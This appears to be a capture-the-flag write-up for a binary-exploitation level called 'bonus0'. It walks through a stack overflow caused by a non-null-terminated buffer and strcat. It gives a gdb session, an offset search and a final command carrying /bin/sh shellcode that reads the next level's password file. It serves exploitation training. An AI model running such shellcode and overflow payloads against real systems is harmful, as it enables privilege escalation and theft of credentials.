### Brief
For this program there is a `main`, a `pp` and a `p` function.
The `main` function has a stack buffer of size 54, call `pp` on this buffer and display the buffer using `puts`
The `pp` function has two buffer of size 20 and call `p` once for each buffer.
It then copy the first buffer onto the `main buffer` replace the `\0` with a space character.
And it uses `strcat` on the `main buffer` and the second buffer.
The `p` function is used to write the stdin in a buffer of size `4096`, search for a `\n` and replace it with a `\0`.

### Exploit
Here we can see that the `p` function in charge of null terminating the input buffer can be exploited.
Indeed it replace `\n` with a `\0` in its internal buffer but copies only the 20 first bytes.
So we can manage to make the first buffer of `pp` non-null terminated.

Keeping in mind that the `main` buffer is of size 54.
Our first buffer of size 20 is copied inside but is not null terminated.
So it `strcpy` overflows and also copy the second buffer inside our `main buffer`.
Since the second buffer needs to be null terminated we copy 20 bytes into the `main buffer`
So far, 40 bytes are copied inside the `main buffer` with the first `strcpy`.
It adds a space character at the end of the buffer.
And it `strcat` the `main buffer` with the second buffer.
Now we copied 60 bytes into the `main buffer` so we overflow it by 6 bytes which is enough to modify the return address.

Now we need to create the payload.
The first input will be 20 `NOP` instructions.
The second one will be used to now with the pattern generator to get the offset of the return address.

```bash
(python -c "print('A' * 20)"; python -c "print('Aa0Aa1Aa2Aa3Aa4Aa5A')") | ./bonus0
dmesg
...
[ 2931.503208] bonus0[16693]: segfault at 35614134 ip 35614134 sp bffff770 error 14
```

The offset is 14.

Now we will place our shellcode inside the giant buffer of the `p` function.
We will place it using our second input and add some `NOP` instructions.
We just need to get the address of the `p` buffer.


```bash
(gdb) b p
Breakpoint 1 at 0x80484bd
(gdb) r
Starting program: /home/user/bonus0/bonus0 

Breakpoint 1, 0x080484bd in p ()
(gdb) x $esp
0xbfffe670:	0x00000000
```

The start address of the `p` buffer is `0xbfffe670`.

### Get access

```bash
(python -c "print('A' * 20)"; python -c "print('A'*14 + '\xd0\xe6\xff\xbf' + 'A' + '\n' + 100*'\x90' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80')"; echo 'cat /home/user/bonus1/.pass') | ./bonus0
```